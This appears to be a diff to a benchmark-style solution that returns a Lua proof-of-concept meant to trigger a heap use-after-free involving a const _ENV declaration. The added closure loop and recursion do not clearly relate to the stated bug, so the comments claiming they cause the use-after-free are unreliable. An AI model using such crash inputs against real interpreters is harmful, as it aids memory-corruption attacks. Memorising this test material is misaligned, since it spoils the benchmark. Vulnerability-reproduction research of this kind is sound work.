@@ -1,28 +1,31 @@
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        poc = b"""-- PoC for Lua heap use after free when _ENV is treated as const
-local _ENV = _ENV
-local const_env = _ENV
+        poc = """local _ENV: const = _ENV
 
-function test()
-    local x = _ENV
-    x = const_env
-    return x
+-- Trigger incorrect code generation leading to heap UAF
+do
+    local function create_closure()
+        local tbl = {}
+        for i = 1, 1000 do
+            tbl[i] = function() return i end
+        end
+        return tbl
+    end
+    local closures = create_closure()
+    for i = 1, 1000 do
+        closures[i]()
+    end
 end
 
-print(test())
-
--- Add more code to reach approximate length or trigger specific condition
-for i = 1, 100 do
-    local y = _ENV
-    y = const_env
+-- Additional code to exacerbate memory issues
+local function recursive(n)
+    if n > 0 then
+        local t = {recursive(n - 1)}
+        return t
+    end
+    return nil
 end
 
--- Complex expression to potentially trigger codegen bug
-local a = (_ENV or const_env).test
-local b = a and (_ENV.const or const_env)
-local c = b(x) or _ENV
-
-print(c)
-"""
-        return poc
+local deep = recursive(100)
+print("Done")"""
+        return poc.encode('utf-8')
